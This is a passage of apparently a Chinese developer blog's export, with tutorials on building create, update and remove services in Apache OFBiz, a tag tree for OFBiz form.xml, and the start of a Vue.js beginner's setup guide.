class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;preparationId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;useProject&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;startTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java.sql.Timestamp&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;finishTime&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java.sql.Timestamp&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">services</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&lt;sevice&gt;标签中，name是该服务的名字，engine是服务的实现方式，location指向java类的位置，invoke指向该java类中的一个方法（函数）。&lt;attribute&gt;标签中，name是传进该方法中的数据项的名字，type是该数据项的类型，mode&#x3D;”IN”表示传进，”OUT”表示传出。</p>
<p>（2）实现该java类及方法。在learning&#x2F;src下，创建org&#x2F;ofbiz&#x2F;learning&#x2F;目录，并在该目录下创建一个名为ProductPlanServices的java类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ofbiz.learning;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.ofbiz.base.util.Debug;</span><br><span class="line"><span class="keyword">import</span> org.ofbiz.base.util.UtilMisc;</span><br><span class="line"><span class="keyword">import</span> org.ofbiz.base.util.UtilProperties;</span><br><span class="line"><span class="keyword">import</span> org.ofbiz.base.util.UtilValidate;</span><br><span class="line"><span class="keyword">import</span> org.ofbiz.entity.Delegator;</span><br><span class="line"><span class="keyword">import</span> org.ofbiz.entity.GenericEntityException;</span><br><span class="line"><span class="keyword">import</span> org.ofbiz.entity.GenericValue;</span><br><span class="line"><span class="keyword">import</span> org.ofbiz.service.DispatchContext;</span><br><span class="line"><span class="keyword">import</span> org.ofbiz.service.ServiceUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductPlanServices</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">module</span>   <span class="operator">=</span> ProductPlanServices.class.getName();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;ProductPlanUiLabels&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * create xpp Learn</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dctx</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; <span class="title function_">createProductPlan</span><span class="params">(DispatchContext dctx, Map&lt;String, ? extends Object&gt; context)</span></span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="comment">//获取用户信息</span></span><br><span class="line">        <span class="type">Locale</span> <span class="variable">locale</span> <span class="operator">=</span> (Locale) context.get(<span class="string">&quot;locale&quot;</span>);</span><br><span class="line">        <span class="comment">//获取返回的Map类</span></span><br><span class="line">        Map&lt;String, Object&gt; result = ServiceUtil.returnSuccess();</span><br><span class="line">        <span class="comment">//获取数据库操作类</span></span><br><span class="line">        <span class="type">Delegator</span> <span class="variable">delegator</span> <span class="operator">=</span> dctx.getDelegator();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取传进来的数据项</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">productPlanId</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;productPlanId&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">itemId</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;itemId&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">principleId</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;principleId&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">preparationId</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;preparationId&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">useProject</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;useProject&quot;</span>);</span><br><span class="line">		<span class="type">Timestamp</span> <span class="variable">startTime</span> <span class="operator">=</span> (Timestamp) context.get(<span class="string">&quot;startTime&quot;</span>);</span><br><span class="line">		<span class="type">Timestamp</span> <span class="variable">finishTime</span> <span class="operator">=</span> (Timestamp) context.get(<span class="string">&quot;finishTime&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//将这些数据项放进一个Map类对象中</span></span><br><span class="line">		Map&lt;String, Object&gt; ProductPlanMap = UtilMisc.toMap(<span class="string">&quot;productPlanId&quot;</span>, productPlanId,<span class="string">&quot;itemId&quot;</span>,itemId,<span class="string">&quot;principleId&quot;</span>,principleId);</span><br><span class="line">		ProductPlanMap.put(<span class="string">&quot;preparationId&quot;</span>, preparationId);</span><br><span class="line">		ProductPlanMap.put(<span class="string">&quot;useProject&quot;</span>, useProject);</span><br><span class="line">		ProductPlanMap.put(<span class="string">&quot;startTime&quot;</span>, startTime);</span><br><span class="line">		ProductPlanMap.put(<span class="string">&quot;finishTime&quot;</span>, finishTime);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//将Map类放入一个名为ProductPlan的数据表中，GenericValue类的对象相当于数据表中的一条记录</span></span><br><span class="line">        <span class="type">GenericValue</span> <span class="variable">GV</span> <span class="operator">=</span> delegator.makeValue(<span class="string">&quot;ProductPlan&quot;</span>, ProductPlanMap);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	<span class="comment">//创建这条记录</span></span><br><span class="line">        	GV.create(); &#125;</span><br><span class="line">        <span class="keyword">catch</span> (GenericEntityException e) &#123;</span><br><span class="line">            Debug.logError(e, e.getMessage(), <span class="keyword">module</span>);</span><br><span class="line">            <span class="keyword">return</span> ServiceUtil.returnError(UtilProperties.getMessage(resource,</span><br><span class="line">                    <span class="string">&quot;Learn.create.error&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; e.getMessage() &#125;, locale));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * update Learn xpp</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dctx</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; <span class="title function_">updateProductPlan</span><span class="params">(DispatchContext dctx,Map&lt;String, ? extends Object&gt; context)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Locale</span> <span class="variable">locale</span> <span class="operator">=</span> (Locale) context.get(<span class="string">&quot;locale&quot;</span>);</span><br><span class="line">        Map&lt;String, Object&gt; result = ServiceUtil.returnSuccess();</span><br><span class="line">        <span class="type">Delegator</span> <span class="variable">delegator</span> <span class="operator">=</span> dctx.getDelegator();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取传进的数据项</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">productPlanId</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;productPlanId&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">itemId</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;itemId&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">principleId</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;principleId&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">preparationId</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;preparationId&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">useProject</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;useProject&quot;</span>);</span><br><span class="line">		<span class="type">Timestamp</span> <span class="variable">startTime</span> <span class="operator">=</span> (Timestamp) context.get(<span class="string">&quot;startTime&quot;</span>);</span><br><span class="line">		<span class="type">Timestamp</span> <span class="variable">finishTime</span> <span class="operator">=</span> (Timestamp) context.get(<span class="string">&quot;finishTime&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//将id放进一个Map中</span></span><br><span class="line">		Map&lt;String, Object&gt; ProductPlanMap = UtilMisc.toMap(<span class="string">&quot;productPlanId&quot;</span>, productPlanId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	<span class="comment">//通过该Map对象即ProductPlanId，寻找与该id相同的数据表中的记录</span></span><br><span class="line">			<span class="type">GenericValue</span> <span class="variable">GV</span> <span class="operator">=</span> delegator.findOne(<span class="string">&quot;ProductPlan&quot;</span>, ProductPlanMap , <span class="literal">false</span>);</span><br><span class="line">			<span class="comment">//如果找不到这条记录就报错</span></span><br><span class="line">            <span class="keyword">if</span>(UtilValidate.isEmpty(GV))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> ServiceUtil.returnError(UtilProperties.getMessage(resource,<span class="string">&quot;ProductPlan.update.error.entity.notFound&quot;</span>, locale));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果找到了，就把传进来的数据放到该记录中</span></span><br><span class="line">            GV.put(<span class="string">&quot;itemId&quot;</span>, itemId);</span><br><span class="line">            GV.put(<span class="string">&quot;principleId&quot;</span>, principleId);</span><br><span class="line">            GV.put(<span class="string">&quot;preparationId&quot;</span>, preparationId);</span><br><span class="line">    		GV.put(<span class="string">&quot;useProject&quot;</span>, useProject);</span><br><span class="line">    		GV.put(<span class="string">&quot;startTime&quot;</span>, startTime);</span><br><span class="line">    		GV.put(<span class="string">&quot;finishTime&quot;</span>, finishTime);</span><br><span class="line">    		<span class="comment">//更新该记录</span></span><br><span class="line">            GV.store();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (GenericEntityException e) &#123;</span><br><span class="line">            Debug.logError(e, e.getMessage(), <span class="keyword">module</span>);</span><br><span class="line">            <span class="keyword">return</span> ServiceUtil.returnError(UtilProperties.getMessage(resource,</span><br><span class="line">                    <span class="string">&quot;Learn.update.error&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; e.getMessage() &#125;, locale));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上只是一个简单的操作数据库的java类，部分内容的讲解已经在该类的注释中，如果想更好地了解service服务，可以参考Apache+OFBiz+开发初学者指南.chm和ofbiz菜鸟笔记.doc。</p>
<p>（3）编写完类和方法后，接下来的工作非常重要：</p>
<ul>
<li>检查learning&#x2F;ofbiz-component.xml中有没有以下代码：</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">classpath</span> <span class="attr">type</span>=<span class="string">&quot;jar&quot;</span> <span class="attr">location</span>=<span class="string">&quot;build/lib/*&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">service-resource</span> <span class="attr">type</span>=<span class="string">&quot;model&quot;</span> <span class="attr">loader</span>=<span class="string">&quot;main&quot;</span> <span class="attr">location</span>=<span class="string">&quot;servicedef/services.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>检查controller.xml中有没有以下代码：</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">location</span>=<span class="string">&quot;component://common/webcommon/WEB-INF/common-controller.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>当然，如果你是用笔者第二步提供的方法来创建learning组件，那么你可以不必检查。</li>
</ul>
<p>（4）重中之重，右键learning&#x2F;src—选择构建路径—选择做源文件夹。</p>
<p>（5）泰山之重，右键learning&#x2F;build.xml文件—选择运行方式（Run as）—选择第二个Ant<br>构建—进入编辑配置界面—在目标界面选择jar（一般默认就已经选择）—点击运行，运行完成后检查learning&#x2F;build下是不是有东西了（文件夹不算）。</p>
<p>3、在controller.xml添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;CreateProductPlan&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;service&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;createProductPlan&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;EditProductPlan&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;EditProductPlan&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;UpdateProductPlan&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;service&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;updateProductPlan&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;EditProductPlan&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;EditProductPlan&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意请求映射中多了一个event映射，表明该请求会调用该服务（invoke对应services.xml中声明的服务），通过该服务后才到达视图部分，而映射的视图此前已经创建完成了。</p>
<p>4、到此，Create以及Update功能已经完成，但增删改查还差了删除功能，不过这已经是手到擒来的了。</p>
<h3 id="八、Remove功能"><a href="#八、Remove功能" class="headerlink" title="八、Remove功能"></a>八、Remove功能</h3><p>1、通过第七步，我们可以知道，涉及数据库操作功能时，我们不需要新建视图，只需要让该请求通过event进入服务，然后返回到已有视图即可，所以在controller.xml中，我们只需要添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;RemoveProductPlan&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;service&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;removeProductPlan&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;FindProductPlan&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;FindProductPlan&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、然后在services.xml中添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">&quot;removeProductPlan&quot;</span> <span class="attr">engine</span>=<span class="string">&quot;java&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">location</span>=<span class="string">&quot;org.ofbiz.learning.ProductPlanServices&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;removeProductPlan&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">description</span>&gt;</span>Remove a ProductPlan<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;productPlanId&quot;</span> <span class="attr">type</span>=<span class="string">&quot;String&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;IN&quot;</span> <span class="attr">optional</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于删除的时候只需要知道id号，因此传进id号即可。</p>
<p>3、在ProductPlanServices类中添加一个删除方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; <span class="title function_">removeProductPlan</span><span class="params">(DispatchContext dctx,</span></span><br><span class="line"><span class="params">            Map&lt;String, ? extends Object&gt; context)</span> &#123;</span><br><span class="line">        <span class="type">Locale</span> <span class="variable">locale</span> <span class="operator">=</span> (Locale) context.get(<span class="string">&quot;locale&quot;</span>);</span><br><span class="line">        Map&lt;String, Object&gt; result = ServiceUtil.returnSuccess();</span><br><span class="line">        <span class="type">Delegator</span> <span class="variable">delegator</span> <span class="operator">=</span> dctx.getDelegator();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">productPlanId</span> <span class="operator">=</span> (String) context.get(<span class="string">&quot;productPlanId&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="type">GenericValue</span> <span class="variable">gv</span> <span class="operator">=</span> delegator.findOne(<span class="string">&quot;ProductPlan&quot;</span>, UtilMisc.toMap(<span class="string">&quot;productPlanId&quot;</span>, productPlanId),<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span>(UtilValidate.isEmpty(gv))&#123;</span><br><span class="line">                <span class="keyword">return</span> ServiceUtil.returnError(UtilProperties.getMessage(resource,<span class="string">&quot;Learn.delete.error.entity.notFound&quot;</span>, locale));</span><br><span class="line">            &#125;</span><br><span class="line">            gv.remove();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (GenericEntityException e) &#123;</span><br><span class="line">            Debug.logError(e, e.getMessage(), <span class="keyword">module</span>);</span><br><span class="line">            <span class="keyword">return</span> ServiceUtil.returnError(UtilProperties.getMessage(resource,</span><br><span class="line">                    <span class="string">&quot;Learn.delete.error&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; e.getMessage() &#125;, locale));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>4、最后，不要忘记通过build.xml对该类进行编译。另外，当对services.xml文件或java类进行修改后，要停止ofbiz再启动，否则修改无效。</p>
<h3 id="结语（本文结束的几个月后所添加的）"><a href="#结语（本文结束的几个月后所添加的）" class="headerlink" title="结语（本文结束的几个月后所添加的）"></a>结语（本文结束的几个月后所添加的）</h3><p>随着笔者对ofbiz的研究时间日益长久，又有一番心得，包括如下几点：</p>
<ul>
<li><p>一定要学习ofbiz中自创的mililang语言————类似一种有逻辑的标签语言。该语言在ofbiz中用处很大，可以很快速地编写一个服务，且不需要编译；可以在“表单”form以及“屏幕”screen的动作action中使用。至于怎么学习，依旧参考这位<a href="http://ofbizer.iteye.com/blog/2037779">大神的博客</a></p>
</li>
<li><p>一定要时常回去看看<em>Apache+OFBiz+开发初学者指南[Ob4.0-EN+Ob9.0-CN].chm</em>，包含了很多知识点。</p>
</li>
<li><p>服务service和事件event的区别在于：服务用来对数据库进行操作，而事件用于实现逻辑跳转、数据处理之类的功能。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>Ofbiz</tag>
      </tags>
  </entry>
  <entry>
    <title>ofbiz表单标签树图</title>
    <url>/ofbiz%E8%A1%A8%E5%8D%95%E6%A0%87%E7%AD%BE%E6%A0%91%E5%9B%BE.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>以下是笔者自己总结的，关于ofbiz中form.xml文件的标签树。因本人对ofbiz的研究有限，所以无法体现的所有标签，但也希望能给读者带来帮助。<br>其中有几点需要注意的：</p>
<ul>
<li>标签的父子关系通过序号来体现，比如：actions标签的序号是1.1.1，form标签的序号是1.1，所以actions标签就是form的子标签。</li>
<li>标签的属性由标签后的”—-“引出。</li>
<li>属性之间由”||”分隔而开。</li>
<li>属性后的”()”用来体现该属性的 值 或 示例，比如display标签的type属性可以等于date，即&lt;display type&#x3D;”true”&gt;。</li>
<li>标签或标签中属性的效果，此处未言，只能靠读者自己尝试了。</li>
</ul>
<span id="more"></span>

<hr>
<p>1.form.xml</p>
<p>1.1. form—-name||type(single,list)||target||title||default-map-name||header-row-style(header-row)||default-table-style(basic-table)||default-entity-name||odd-row-style(alternate-row)||separate-columns(true)</p>
<p>1.1.1. actions</p>
<p>1.1.1.1. set—-field||value</p>
<p>1.1.1.2. service</p>
<p>1.1.1.2.1. field-map—-field-name||from-field</p>
<p>1.1.2. alt-target—-use-when||target</p>
<p>1.1.3. field—-name||title||widget-style(buttontext,required,dateISO,smallSubmit)||position||tooltip||sort-field(true)||use-when（agreementId&#x3D;&#x3D;null）</p>
<p>1.1.3.1. text-find—-hide-options(true)</p>
<p>1.1.3.2. submit—-button-type(button)</p>
<p>1.1.3.3. hyperlink—-description||target||confirmation-message||target-type(intra-app)</p>
<p>1.1.3.3.1. parameter—-param-name</p>
<p>1.1.3.4. display—-type(date)</p>
<p>1.1.3.5. text—-default-value||size</p>
<p>1.1.3.6. lookup—-target-form-name||size</p>
<p>1.1.3.7. date-time</p>
<p>1.1.3.8. textarea—-rows||cols||default-value</p>
<p>1.1.3.9. drop-down—-allow-empty(true)||no-current-selected-key</p>
<p>1.1.3.9.1. entity-options—-description||entity-name||key-field-name</p>
<p>1.1.3.9.1.1. entity-constraint—-name||value</p>
<p>1.1.3.9.1.2. entity-learn-by—-field-name</p>
<p>1.1.3.9.1.3. entity-order-by—-field-name</p>
<p>1.1.3.9.2. option—-key||description</p>
<p>1.1.3.10. hidden—-value</p>
<p>1.1.3.11. display-entity—-entity-name||description||key-field-name</p>
<p>1.1.3.12. ignored</p>
<p>1.1.3.13. auto-fields-service—-service-name||map-name</p>
<p>1.1.3.14. sort-order</p>
<p>1.1.3.14.1. field-group—-collapsible(true)||title||initially-collapsed(true)</p>
<p>1.1.3.14.1.1. sort-field</p>
<p>1.1.3.14.2. sort-field—-name</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>Ofbiz</tag>
      </tags>
  </entry>
  <entry>
    <title>vueJs入门</title>
    <url>/vueJs%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h2 id="1、下载node-js，再安装npm和vue"><a href="#1、下载node-js，再安装npm和vue" class="headerlink" title="1、下载node.js，再安装npm和vue"></a>1、下载node.js，再安装npm和vue</h2><p>（1）到node.js官网下载node.js。下载并安装成功后，在控制台输入：<code>node -v</code> ，查看node是否安装成功；输入：<code>npm -v</code> ，查看node自带的npm是否安装成功。</p>
<p>（2）安装cnpm（中国版npm），控制台输入：<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>。</p>
<p>（3）安装vue和vue-cli，控制台分别输入：<code>cnpm install -g vue</code> 和 <code>cnpm install -g vue-cli</code> 。（由于新版的vue-cli已经集成了webpack 所以下载了这个脚手架之后就不需要在下载webpack了）</p>
<span id="more"></span>

<h2 id="2、vue-cli脚手架快速搭建静态网站"><a href="#2、vue-cli脚手架快速搭建静态网站" class="headerlink" title="2、vue-cli脚手架快速搭建静态网站"></a>2、vue-cli脚手架快速搭建静态网站</h2><p>（1）在合适的地方新建一个vuejs文件夹。<strong>控制台</strong>进入该进入文件夹，并输入如下命令：<code>vue init webpack test</code> 。该命令新建一个vue项目，test是该项目的名字。输入之后，控制台会出现跳出一些询问，全部按下回车确认即可。</p>
<p>（2）控制台进入vuejs&#x2F;test目录下，依次输入：<code>cnpm install</code> 和 <code>cnpm run dev</code>。 成功之后再浏览器输入 localhost:8080 测试。</p>
<p>（3）修改test&#x2F;src&#x2F;compoents&#x2F;HelloWord.vue文件，修改并实现helloWord。</p>
<h2 id="3、学习vue"><a href="#3、学习vue" class="headerlink" title="3、学习vue"></a>3、学习vue</h2><h3 id="（1）vue-cli2-项目文件结构"><a href="#（1）vue-cli2-项目文件结构" class="headerlink" title="（1）vue-cli2 项目文件结构"></a>（1）vue-cli2 项目文件结构</h3><ul>
<li>build&#x2F;: 文件是 webpack 的打包编译配置文件</li>
<li>config&#x2F;: 文件夹存放的是一些配置项，比如服务器访问的端口配置等</li>
<li>node_modules&#x2F;: npm安装的该项目的依赖库</li>
<li>src&#x2F;: 这里是我们要开发的目录，基本上要做的事情都在这个目录里。</li>
<li>src&#x2F;components&#x2F;: 文件夹用来存放Vue组件。个人建议，把每一个组件中使用到的image图片放置到对应的组件子文件目录下，便于统一的管理</li>
<li>src&#x2F;App.vue: 根组件，所有的子组件都将在这里被引用</li>
<li>src&#x2F;main.js: 入口文件的 js 逻辑，在webpack 打包之后将被注入到 index.html 中</li>
<li>src&#x2F;router&#x2F;: 文件夹存放的是跟vue-router相关的路由配置项</li>
<li>src&#x2F;assets&#x2F;: 放置一些图片，如logo等。后期可以酌情删除，添加其他我们需要的文件夹</li>
<li>static&#x2F;: 文件夹存放一些静态的、较少变动的image或者css文件</li>
<li>test&#x2F;: 初始测试目录，可删除，init安装时如果按照提示选No，就直接不会显示</li>
<li>dist&#x2F;: 该文件夹一开始是不存在，在我们的项目经过 build 之后才会产出</li>
<li>index.html: 整个项目的入口文件，将会引用我们的根组件 App.vue</li>
<li>package.json: 项目配置文件</li>
<li>README.md: 项目的说明文档，markdown 格式</li>
</ul>
<h3 id="（2）vue对象属性"><a href="#（2）vue对象属性" class="headerlink" title="（2）vue对象属性"></a>（2）vue对象属性</h3><ul>
<li><code>date</code>属性用于定义数据，使用如</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;name&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>method</code>属性用于定义函数，使用如</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;changeName()&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>computed</code>属性用于计算数据（相当于函数），使用如：</li>
</ul>
